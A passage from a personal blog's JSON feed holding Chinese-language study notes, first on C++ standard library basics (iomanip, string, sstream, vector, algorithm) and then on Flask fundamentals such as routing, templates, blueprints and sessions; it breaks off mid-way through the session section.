符号</td>\n<td style=\"text-align:left\"><code>std::cout &lt;&lt; std::showpos &lt;&lt; 42;</code></td>\n<td style=\"text-align:left\"><code>+42</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>std::noshowpos</code></td>\n<td style=\"text-align:left\">不显示正数的  <code>+</code>  符号（默认）</td>\n<td style=\"text-align:left\"><code>std::cout &lt;&lt; std::noshowpos &lt;&lt; 42;</code></td>\n<td style=\"text-align:left\"><code>42</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>std::boolalpha</code></td>\n<td style=\"text-align:left\">布尔值以  <code>true/false</code>  输出</td>\n<td style=\"text-align:left\"><code>std::cout &lt;&lt; std::boolalpha &lt;&lt; true;</code></td>\n<td style=\"text-align:left\"><code>true</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>std::noboolalpha</code></td>\n<td style=\"text-align:left\">布尔值以  <code>1/0</code>  输出（默认）</td>\n<td style=\"text-align:left\"><code>std::cout &lt;&lt; std::noboolalpha &lt;&lt; true;</code></td>\n<td style=\"text-align:left\"><code>1</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>std::setbase(int n)</code></td>\n<td style=\"text-align:left\">设置整数的进制（支持 8、10、16）</td>\n<td style=\"text-align:left\"><code>std::cout &lt;&lt; std::setbase(16) &lt;&lt; 42;</code></td>\n<td style=\"text-align:left\"><code>2a</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>std::resetiosflags</code></td>\n<td style=\"text-align:left\">重置指定的流状态</td>\n<td style=\"text-align:left\"><code>std::cout &lt;&lt; std::resetiosflags(std::ios::showbase) &lt;&lt; std::hex &lt;&lt; 42;</code></td>\n<td style=\"text-align:left\"><code>2a</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>std::setiosflags</code></td>\n<td style=\"text-align:left\">设置指定的流状态</td>\n<td style=\"text-align:left\"><code>std::cout &lt;&lt; std::setiosflags(std::ios::showbase) &lt;&lt; std::hex &lt;&lt; 42;</code></td>\n<td style=\"text-align:left\"><code>0x2a</code></td>\n</tr>\n</tbody>\n</table>\n<p>其中比较重要的：</p>\n<pre><code class=\"language-c++\">cout&lt;&lt; setfill('*')&lt;&lt;std::left&lt;&lt; setw(10) &lt;&lt; number;\n//默认空格填充，以及右对齐\ncout&lt;&lt;std::fixed&lt;&lt;setprecision(3) &lt;&lt; pi;\n//默认是科学计数（std::scientific）,这里固定小数点并设置浮点有效位数\ncout &lt;&lt; std::setiosflags(std::ios::uppercase) &lt;&lt; std::hex &lt;&lt; 255;\n//设置格式标志，在输出十六进制数、科学计数法表示的数等时，其中的字母会以大写形式输出（默认小写）。后续使用std::resetiosflags(std::ios::uppercase)清除。后一个就是输出数字以十六进制\n</code></pre>\n<h3 id=\"string\"><a class=\"anchor\" href=\"#string\">#</a> &lt;string&gt;</h3>\n<ul>\n<li>\n<p><code>size()</code> ：返回字符串的长度。</p>\n</li>\n<li>\n<p><code>empty()</code> ：检查字符串是否为空。</p>\n</li>\n<li>\n<p><code>operator[]</code> ：通过索引访问字符串中的字符。</p>\n</li>\n<li>\n<p><code>substr(开始位置索引，长度)</code> ：返回子字符串。</p>\n</li>\n<li>\n<p><code>find(要查找的字符)</code> ：查找子字符串在主字符串中的位置，返回索引，没找到是 - 1。</p>\n<p>改为 <code>rfind</code>  就反向寻找。</p>\n</li>\n<li>\n<p><code>replace(索引,替换字符数，替换字符)</code> ：替换字符串中的某些字符。</p>\n</li>\n</ul>\n<p>insert,erase 也都使用，语法和下面那个 vector 一样</p>\n<p>[其他见]( <a href=\"https://www.runoob.com/cplusplus/cpp-libs-string.html\">C++ 标准库  | 菜鸟教程</a> )</p>\n<h3 id=\"sstream\"><a class=\"anchor\" href=\"#sstream\">#</a> &lt;sstream&gt;</h3>\n<p>处理字符串和数字之间的转换  （可以像处理流一样处理字符串）</p>\n<p>主要类</p>\n<ul>\n<li><code>istringstream</code> ：用于从字符串中读取数据。</li>\n<li><code>ostringstream</code> ：用于将数据写入字符串。</li>\n<li><code>stringstream</code> ：是 <code>istringstream</code>  和 <code>ostringstream</code>  的组合，可以同时进行读取和写入操作。</li>\n</ul>\n<pre><code class=\"language-c++\">//定义\nstd::istringstream iss(&quot;some data&quot;);\nstd::ostringstream oss;\nstd::stringstream ss;\n//读取数字，读取的类型跟定义的有关，不够则保留原有值\nint i;\ndouble d;\niss &gt;&gt; i &gt;&gt; d;\n//写入数据，都变成字符串\noss &lt;&lt; i &lt;&lt; &quot; &quot; &lt;&lt; d;\n//覆写，返回已有内容（如有参数去覆写，则返回覆写后的）,这里是清空\nstring a;\na=oss.str(&quot;&quot;);\n</code></pre>\n<h3 id=\"vector\"><a class=\"anchor\" href=\"#vector\">#</a> &lt;vector&gt;</h3>\n<p>用于存储动态大小的数组</p>\n<p>序列容器，允许用户在容器的末尾快速地添加或删除元素</p>\n<pre><code class=\"language-c++\">// 空的vector\nstd::vector&lt;int&gt; vec1;   \n// 长度为5的vector，元素默认初始化\nstd::vector&lt;int&gt; vec2(5);\n// 长度为5的vector，元素值为10\nstd::vector&lt;int&gt; vec3(5, 10);  \n// 使用初始化列表初始化\nstd::vector&lt;int&gt; vec4 = &#123;1, 2, 3, 4&#125;;   \n</code></pre>\n<pre><code class=\"language-c++\">//添加，访问，数量，清空，检查是否为空（返回bool）\nmyVector.push_back(10);或者myVector.emplace_back()\n    //前者是先创建临时匀速，然后复制或移动过去，后者直接尾部构造\nint firstElement = myVector[0];\nsize_t size = myVector.size();  //循环中会用到i&lt;myVector.size()\nmyVector.clear();\nnumbers.empty();\n</code></pre>\n<p>其他：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">函数</th>\n<th style=\"text-align:left\">说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\"><code>push_back(const T&amp; val)</code></td>\n<td style=\"text-align:left\">在末尾添加元素</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>pop_back()</code></td>\n<td style=\"text-align:left\">删除末尾元素</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>at(size_t pos)</code></td>\n<td style=\"text-align:left\">返回指定位置的元素，带边界检查，会抛异常</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>operator[]</code></td>\n<td style=\"text-align:left\">返回指定位置的元素，不带边界检查</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>front()</code></td>\n<td style=\"text-align:left\"><strong>返回第一个元素</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>back()</code></td>\n<td style=\"text-align:left\"><strong>返回最后一个元素</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>data()</code></td>\n<td style=\"text-align:left\">返回指向底层数组的指针</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>size()</code></td>\n<td style=\"text-align:left\">返回当前元素数量</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>capacity()</code></td>\n<td style=\"text-align:left\">返回当前分配的容量</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>reserve(size_t n)</code></td>\n<td style=\"text-align:left\">预留至少  <code>n</code>  个元素的存储空间，防止频繁分配</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>resize(size_t n)</code></td>\n<td style=\"text-align:left\">将元素数量调整为  <code>n</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>clear()</code></td>\n<td style=\"text-align:left\">清空所有元素</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>insert(iterator pos, val)</code></td>\n<td style=\"text-align:left\">在指定位置插入元素</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>erase(iterator pos)</code></td>\n<td style=\"text-align:left\">删除指定位置的元素</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>begin()</code>  /  <code>end()</code></td>\n<td style=\"text-align:left\">返回起始 / 结束<strong>迭代器</strong>（0/n）</td>\n</tr>\n</tbody>\n</table>\n<pre><code class=\"language-c++\">insert(iterator pos, const T&amp; val);\nerase(iterator pos);\n//pos：一个迭代器，指向容器中要插入/删除元素的位置。\n！！！注意是插入到指定位置之前（也就是插入的元素自身占据了那个位置）。\n//val：要插入的元素的值。\n返回值：返回指向新插入元素的迭代器/指向被删除元素之后元素的迭代器，删最后一个就返回end()。\npos通常是`a.begin/end()+数字`的形式，数字就是索引，当然也可以用上述返回的迭代器操作\n//操作后的其他元素会依次移动\n</code></pre>\n<p>就算你用不到那么多功能，也可以当作普通的数组使用</p>\n<p>for (int a:vector), 这种语法仍然正确。</p>\n<p>同时，它有指针和引用，并且作为参数传递，等同于数组，<strong>不会退化</strong>（如果不是下面第二种的话），<strong>可以当作返回值</strong></p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">modifyVector</span><span class=\"token punctuation\">(</span>vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">*</span> vec<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>也可以</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">modifyVector</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>vec<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> vec<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>注意一下：容器名不是指针</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>std<span class=\"token double-colon punctuation\">::</span>vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token function\">createVector</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> vec<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"algorithm\"><a class=\"anchor\" href=\"#algorithm\">#</a> &lt;algorithm&gt;</h3>\n<p>提供了一组用于操作容器（如普通数组（包括其指针）、向量、列表等）的算法 (楼上那个也行)</p>\n<p>基本语法（大多数）：</p>\n<pre><code class=\"language-c++\">algorithm_name(container.begin(), container.end(), ...);\n//下面迭代器就不解释了\n</code></pre>\n<h4 id=\"1排序\"><a class=\"anchor\" href=\"#1排序\">#</a> 1. 排序</h4>\n<pre><code class=\"language-c++\">//最后一个参数是排序函数，不指定时，基本类型按升序\nsort(container.begin(), container.end(), compare_function);\n//部分排序，前三个升序（在到end()的范围中，不包含），剩下未定义\npartial_sort(vec.begin(), vec.begin() + 3, vec.end());\n//稳定排序，当相等时保持原顺序，用于多次排序且要保留上次排序的相对顺序时\nstable_sort(vec.begin(), vec.end(), compare_function);\n</code></pre>\n<h4 id=\"2搜索\"><a class=\"anchor\" href=\"#2搜索\">#</a> 2. 搜索</h4>\n<pre><code>//指向匹配的元素，没有就是end()\nauto it = find(container.begin(), container.end(), value);\n</code></pre>\n<h4 id=\"3复制\"><a class=\"anchor\" href=\"#3复制\">#</a> 3. 复制</h4>\n<pre><code class=\"language-c++\">vector&lt;int&gt; source = &#123;1, 2, 3, 4, 5&#125;;\nint destination[5];\ncopy(source.begin(), source.end(), destination);\n</code></pre>\n<h4 id=\"4比较\"><a class=\"anchor\" href=\"#4比较\">#</a> 4. 比较</h4>\n<pre><code class=\"language-c++\">bool result = equal(first1, last1, first2, compare_function);\n//不包含last，最后那个参数可选，自定义比较规则（函数或 Lambda 表达式），返回bool\n//注意对于基本类型参数是指针，其他是迭代器\n</code></pre>\n<h4 id=\"5修改\"><a class=\"anchor\" href=\"#5修改\">#</a> 5. 修改</h4>\n<pre><code class=\"language-c++\">//翻转\nstd::reverse(vec.begin(), vec.end());\n//区间赋值\nstd::fill(vec.begin(), vec.end(), 0);\n//区间替换指定值\nstd::replace(vec.begin(), vec.end(), 1, 99); \n//区域赋值\nstd::copy(vec.begin(), vec.end(), vec2.begin());\n</code></pre>\n<h4 id=\"ps自定义比较函数\"><a class=\"anchor\" href=\"#ps自定义比较函数\">#</a> PS 自定义比较函数</h4>\n<pre><code class=\"language-c++\">bool compare(int a, int b) &#123;\n    return a &gt; b;\n&#125;\ntrue表示a在b前面，也就是不用换位置，反之亦然。\n对齐输入就是ture按原位置，false反之\n    这里是降序排列\n</code></pre>\n",
            "tags": [
                "技术"
            ]
        },
        {
            "id": "https://zhewanyiershinicheng.github.io/2025/03/20/flask/",
            "url": "https://zhewanyiershinicheng.github.io/2025/03/20/flask/",
            "title": "flask",
            "date_published": "2025-03-20T05:07:20.000Z",
            "content_html": "<p>这是个 python 的库</p>\n<p>安装：</p>\n<p>pip install Flask</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask    <span class=\"token operator\">//</span>导入flask类</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>app <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span>     </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">//</span>创建实例‘app’，__name__是特殊变量，直接执行是__main__，被导入时模块名</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">//</span>用来Flask是构造函数，传递这个变量是为了让Flask应用能找到这个文件</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span>       <span class=\"token operator\">//</span>装饰器，里面那个是url<span class=\"token punctuation\">,</span><span class=\"token string\">'/'</span>就是指网页根目录，该目录下加载该文件</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">hello_world</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">'Hello, World!'</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>     <span class=\"token operator\">//</span>在不是被导入的情况下执行debug</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>debug<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span>       <span class=\"token operator\">//</span>run方法，启动内置的开发服务器，参数表示同时启动调试</pre></td></tr></table></figure><h2 id=\"基本概念\"><a class=\"anchor\" href=\"#基本概念\">#</a> 基本概念</h2>\n<p><strong>路由</strong>：指定在特定 url 执行特定函数</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><strong>视图函数</strong>：视图函数是处理请求并返回响应的 Python 函数。它们通常接收请求对象作为参数，并返回响应对象。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">//</span>需要导入request类</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/greet/&lt;name>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">greet</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'Hello, </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">!'</span></span></pre></td></tr></table></figure><p><strong>请求对象</strong>：请求对象（request）包含了客户端发送的请求信息</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">//</span>需要导入request类</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/submit'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">submit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    username <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>form<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'username'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span>获取POST请求的对应字段</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'Hello, </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>username<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">!'</span></span></pre></td></tr></table></figure><p><strong>响应对象</strong>：响应对象包含了发送给客户端的响应信息，如状态码、响应头、响应体等。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">//</span>需要导入make_response类</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/custom_response'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">custom_response</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    response <span class=\"token operator\">=</span> make_response<span class=\"token punctuation\">(</span><span class=\"token string\">'This is a custom response!'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span>创建自定义响应对象</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    response<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">[</span><span class=\"token string\">'X-Custom-Header'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'Value'</span> <span class=\"token operator\">//</span>创建响应头</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> response</pre></td></tr></table></figure><p><strong>模板</strong>：Flask 使用 Jinja2 模板引擎来渲染 HTML 模板。模板允许你将 Python 代码嵌入到 HTML 中，从而动态生成网页。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">//</span>需要导入render_template类</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/hello/&lt;name>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">hello</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'hello.html'</span><span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">//</span>后面那个是传递给模板的变量，注意模板要在templates文件夹中</pre></td></tr></table></figure><figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span><span class=\"token punctuation\">></span></span>Hello, <span class=\"token comment\"></span>!<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>--模板中使用参数--</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p><strong>应用工厂</strong>：应用工厂是一个 Python 函数，它创建并返回一个 Flask 应用实例。这允许你配置和初始化你的应用，并且可以创建多个应用实例。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">create_app</span><span class=\"token punctuation\">(</span>config_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    app <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    app<span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">.</span>from_object<span class=\"token punctuation\">(</span>config_name<span class=\"token punctuation\">)</span>    <span class=\"token operator\">//</span>这个方法从指定对象加载配置</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">from</span> <span class=\"token punctuation\">.</span> <span class=\"token keyword\">import</span> routes     <span class=\"token operator\">//</span>从当前包中导入模块routes<span class=\"token punctuation\">.</span>py</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    app<span class=\"token punctuation\">.</span>register_blueprint<span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">.</span>bp<span class=\"token punctuation\">)</span>   <span class=\"token operator\">//</span>把其中的蓝图注册到该应用，模块化开发用</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span> app</pre></td></tr></table></figure><p><strong>配置对象</strong>：有一个配置对象，你可以使用它来设置各种配置选项，如数据库连接字符串、调试模式等。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">//</span>上面的config_name</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Config</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    DEBUG <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    SECRET_KEY <span class=\"token operator\">=</span> <span class=\"token string\">'mysecretkey'</span>  <span class=\"token operator\">//</span>密钥，加密会话用</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    SQLALCHEMY_DATABASE_URI <span class=\"token operator\">=</span> <span class=\"token string\">'sqlite:///mydatabase.db'</span>  <span class=\"token operator\">//</span>数据库url</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    STATIC_FOLDER <span class=\"token operator\">=</span> <span class=\"token string\">'static'</span>     <span class=\"token operator\">//</span>静态文件存储路径</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tTEMPLATE_FOLDER <span class=\"token operator\">=</span> <span class=\"token string\">'templates'</span>    <span class=\"token operator\">//</span>蓝图存储路径</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">//</span>这些玩意儿可以Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">,</span>xxx<span class=\"token punctuation\">)</span>来指定。</pre></td></tr></table></figure><p><strong>蓝图</strong>：一个组织代码的方式，它允许你将相关的视图函数、模板和静态文件组织在一起，并且可以在多个应用中重用。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">//</span>需要导入Blueprint</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>bp <span class=\"token operator\">=</span> Blueprint<span class=\"token punctuation\">(</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">,</span> __name__<span class=\"token punctuation\">)</span>  <span class=\"token operator\">//</span>蓝图名<span class=\"token operator\">+</span>当前模块名</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token decorator annotation punctuation\">@bp<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">home</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">'Home Page'</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> <span class=\"token punctuation\">.</span>routes <span class=\"token keyword\">import</span> bp <span class=\"token keyword\">as</span> main_bp  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">//</span>从当前包的 routes<span class=\"token punctuation\">.</span>py 模块里导入 bp 对象，并将其重命名为 main_bp。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">//</span>包是可以嵌套的<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>表示父包，可以认为包是一个存储模块的文件夹（所以用<span class=\"token punctuation\">.</span>或者<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>实际上等同于用相对路径）</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">create_app</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    app <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    app<span class=\"token punctuation\">.</span>register_blueprint<span class=\"token punctuation\">(</span>main_bp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> app</pre></td></tr></table></figure><p><strong>静态文件</strong>：静态文件是不会被服务器端执行的文件，如 CSS、JavaScript 和图片文件。</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>stylesheet<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/css<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>{{ url_for('static', filename='style.css') }}<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">{% raw %}</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>//回去static目录找那个css文件</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>//这个通常是被导入的模板里的</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>//将静态文件放在 static 文件夹中，Flask 会自动提供服务(如果你没改)</pre></td></tr></table></figure><p><strong>扩展</strong>：有其他插件，难说～～</p>\n<p><strong>会话</strong>：存储用户信息，用户浏览应用时可以记住他们的状态。</p>\n<p>就是 session，存储在 cookie</p>\n<p>这里 session 对象用于存取对话数据</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> session</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#可以使用 Python 内置的 secrets 模块生成一个强随机性的密钥</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#import secrets; 